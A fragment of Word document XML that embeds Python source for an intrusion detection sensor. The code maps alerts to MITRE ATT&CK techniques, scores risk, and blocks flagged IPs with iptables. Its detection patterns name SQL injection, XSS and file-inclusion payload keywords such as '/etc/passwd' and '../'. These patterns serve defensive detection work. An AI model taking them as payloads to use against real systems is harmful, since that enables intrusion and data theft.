      </w:r>
    </w:p>
    <w:p w14:paraId="3DCC645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 "Z-Score (statistical)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65336B3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0A64ED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"scan": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072A76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"id": "T1046",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030661C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"name": "Network Service Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E27C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"tactic": "Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59BFE15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"tactic_id": "TA0007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3135221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"severity": "MEDIUM",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6A57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"base_score": 5.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A20C3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 "KNN (behavioural)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BC5F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CB2D9B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"sqli": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7457107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"id": "T1190",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1F1D5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"name": "Exploit Public-Facing Application",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B64FE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"tactic": "Initial Access",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04251A7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"tactic_id": "TA0001",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E74A87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"severity": "HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6E916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"base_score": 9.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CDDA0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 "Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C328A9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9FAF4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"xss": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B766D3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"id": "T1059.007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4947BA8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"name": "Command and Scripting Interpreter: JavaScript",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCBC30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"tactic": "Execution",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2706CD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"tactic_id": "TA0002",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF8F53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"severity": "HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE3DA4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"base_score": 7.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F38CDF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 "Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4141B10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10322E8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"lfi": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703056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"id": "T1083",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097DC0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"name": "File and Directory Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3847F44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"tactic": "Discovery",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B728C7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"tactic_id": "TA0007",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3482F7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"severity": "HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4B02C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"base_score": 7.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB5B00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 "Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242FF24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E6EB54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"payload": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582C7D8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"id": "T1190",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD90BC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"name": "Exploit Public-Facing Application",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA663D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"tactic": "Initial Access",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C50AA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"tactic_id": "TA0001",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9FA10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"severity": "HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF267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"base_score": 8.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316F37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 "Naive Bayes (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BE4B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963A59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"blacklist": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED4C3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"id": "T1071",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736025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"name": "Application Layer Protocol (known-bad infrastructure)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A90B77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"tactic": "Command and Control",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDAC3D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"tactic_id": "TA0011",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F98F6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"severity": "HIGH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A39AC2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"base_score": 7.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618DC9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 "Bloom Filter (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177362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086A34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"anomaly": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0832F15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"id": "T1071",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2560D3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"name": "Anomalous Traffic Profile (behavioural drift)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA905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"tactic": "Command and Control",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054517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"tactic_id": "TA0011",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469065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"severity": "MEDIUM",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9FD93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"base_score": 4.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B5C49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 "K-Means (clustering)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7020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E9826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"unknown": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0BB0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"id": "N/A",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718FA62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"name": "Uncategorised Observation",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE509A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"tactic": "Unknown",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AFC7B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"tactic_id": "N/A",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298CDFD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"severity": "INFO",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C731AD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"base_score": 1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D9494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"engine": "n/a",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DCF1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F36EF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698E908F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D4CAB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Specific payload families roll up to the "payload" category, so a policy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2156304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written as block_on=["payload"] covers sqli, xss and lfi without having to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0287D1F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enumerate every sub-family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8DC77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KIND_GROUPS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2A13E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"sqli": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024B209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"xss": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172E5BB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"lfi": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688200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"payload": "payload",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4A0C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59D73960" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30C0F0BE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74E06C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parent_kind(kind):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BC0FF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the policy group a detection kind belongs to."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BDD98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KIND_GROUPS.get(kind, kind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734F564D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45AEB9A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B1491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payload keyword -&gt; more specific attack family, checked before generic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F12924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_PAYLOAD_FAMILIES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4682EF0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(re.compile(r"(?i)UNION|SELECT|OR 1=1|SLEEP|DROP|INSERT|UPDATE"), "sqli"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2818F10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(re.compile(r"(?i)SCRIPT|ALERT\(|ONERROR|&lt;IMG"), "xss"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE476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(re.compile(r"(?i)/ETC/PASSWD|\.\./|/PROC/SELF"), "lfi"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A96C9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65C0312B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="192B28DF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27CBBC3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classify_kind(message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0075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"""Infer the detection kind from a MANTIS alert string."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AB82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message:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B2FE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"unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E77EC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upper = message.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF6C497" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11E0A38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"DDOS" in upper or "Z-SCORE" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EE679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"ddos"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62097E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"SCAN" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215706D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"scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AF320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"BLACKLIST" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361F76B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"blacklist"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701AE09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"PAYLOAD" in upper or "MALICIOUS" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5227CA7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pattern, family in _PAYLOAD_FAMILIES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8F129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pattern.search(message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC82E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family</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB183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"payload"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111AE5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"ANOMALY" in upper or "CLUSTER" in upper:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD04FC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"anomaly"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059134C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"unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA35618" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B2AA458" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DEFA4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risk_score(kind, confidence=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8E53F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"""Blend the technique base score with engine confidence -&gt; 0.0..10.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48385558" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342EDB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The technique's base score is the ceiling for that class of attack; engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049FD3A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confidence scales it down to 70% at worst. A low-confidence hit on a severe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02871D0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technique therefore still outranks a confident low-severity hit, and no</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1471AFA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score saturates at the top of the scale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686D255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E3D58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base = TECHNIQUES.get(kind, TECHNIQUES["unknown"])["base_score"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52663EC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confidence is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37837AB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round(base, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0876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41BED3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 = max(0.0, min(1.0, float(confidence)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C95A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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AB1F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round(base, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD196D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scaled = base * (0.7 + 0.3 * c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3593E3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round(max(0.0, min(10.0, scaled)), 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058152B0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D4DCDE7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CE0F7F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enrich(message, confidence=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9507B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full ATT&amp;CK context for an alert message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795684B2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="072D92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The returned dict is embedded in the CSV audit log, the JSON UDP telemetry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A67AE8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frame, the web dashboard and the forensic HTML report, so every output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769E67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surface carries the same threat framing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FA3A2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B9663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kind = classify_kind(message)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337DBEA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meta = TECHNIQUES.get(kind, TECHNIQUES["unknown"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A08CB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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6D8F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"kind": kind,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C37C10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"technique_id": meta["id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F5176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"technique": meta["name"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428F15B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"tactic": meta["tactic"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0641FF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"tactic_id": meta["tactic_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF882A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"severity": meta["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B91F3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"engine": meta["engine"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEFD6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"risk_score": risk_score(kind, confidence),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780E660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"reference": ("https://attack.mitre.org/techniques/%s/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6E0CE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meta["id"].replace(".", "/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F2412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meta["id"] != "N/A" else ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BA4E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D5BF28F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B75566D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F8184D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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D10B1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m in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA317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"DDoS DETECTED! Z-Score: 4.21 (PPS: 8500)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CC07F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"PORT SCAN DETECTED! (Unique Ports: 44/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2959827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"MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EEE7D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"MALICIOUS PAYLOAD! Keywords: ['SCRIPT', 'ALERT(']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D422B4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"BLACKLISTED IP DETECTED: 10.0.0.66 (Flagged)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8337C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"ANOMALY DETECTED (Cluster 2)! Suspicious activity.",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFED5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D595E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 = enrich(m, confidence=0.95)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588AC4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print("%-9s %-10s %-38s risk=%.1f" %</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E94688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(e["kind"], e["technique_id"], e["technique"], e["risk_score"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7B0B1C"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src/utils/active_defense.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51662BFB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>106 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B20AE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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645A48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subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76AF0DC3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34AFFBB5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E5830F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ActiveDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785C12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"""Inserts iptables DROP rules for source addresses the engines flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3AF7F8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1447DD5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The rule is inserted with `-I INPUT 1` so it sits at the head of the chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2403B4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and therefore wins over any ACCEPT rule already present; appending it would</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1FB9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leave it unreachable on a host whose policy accepts established traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05094A7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early.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507B38D5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22402F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Whether this class is ever asked to act is decided by the AlertDispatcher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1370DF3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under the NFR-3 opt-in policy - constructing it has no side effects, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2F96F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sensor can always build one and simply never enable blocking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BE9F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3FCA657" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E862CA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__init__(self, whitelist=None, dry_run=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6BBC5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self.blocked_ips = set()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C26106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never block ourselves, whatever an engine decides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4F35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self.whitelist = list(whitelist) if whitelist else ["127.0.0.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D1B32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"0.0.0.0"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD2B9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self.dry_run = dry_run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2227525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self.failures = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598F989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active defense ready (whitelist: %s%s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74DCEA4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 ".join(self.whitelist), ", dry-run" if dry_run else ""))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A13E248" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47DCCB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_iptables_available(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6B9A8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os.name != "nt" and hasattr(os, "geteuid")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4714C9D8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03904D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block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F3F5B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ip in self.whitelist or ip in self.blocked_ips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172587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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CC318A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55952E2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not self._iptables_available():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5718A91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 iptables unavailable on this platform - skipping")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681CD6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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354B236E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E9B13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os.geteuid() != 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5519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 can't block - need root for iptables")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D2D4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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703116A9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="263F51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self.dry_run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662FEC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[dry-run] would block %s" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578046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self.blocked_ips.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2365E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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C087A8D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C5238F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blocking", ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6960D32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429103B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-I INPUT 1 puts the rule at the top so it wins</w:t>
      </w:r>
    </w:p>
